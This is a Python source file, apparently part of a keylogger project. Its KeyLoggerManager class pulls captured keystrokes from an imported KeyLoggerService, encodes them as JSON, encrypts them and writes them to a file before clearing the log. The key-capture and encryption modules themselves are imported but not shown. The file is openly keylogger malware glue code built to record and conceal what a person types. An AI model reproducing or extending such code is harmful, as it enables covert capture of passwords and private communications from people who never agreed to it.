import json
from IWrite import IWrite
from KeyLoggerService import KeyLoggerService
from Encryptor import Encryptor

class KeyLoggerManager:
    def __init__(self, keylogger_service: KeyLoggerService, writer: IWrite) -> None:
        self.keylogger_service = keylogger_service
        self.writer = writer
        self.encrypt = Encryptor()

    def data_to_buffer(self ,data):
        print("data_to_buffer")
        databyte =  json.dumps(data).encode('utf-8')
        return  databyte.decode("utf-8")  # המרה למחרוזת

    def run(self):
        print("run")
        data = self.keylogger_service.get_logged_keys()
        buffer = self.data_to_buffer(data)

        encrypt_buffer = self.encrypt.encryptor(buffer)
        self.writer.Write(encrypt_buffer)
        self.keylogger_service.clear_logged_keys()

if __name__ == '__main__':
    from FileWriter import FileWriter
    k_service = KeyLoggerService()
    writer = FileWriter()
    k_manager = KeyLoggerManager(k_service,writer)
    k_manager.run()
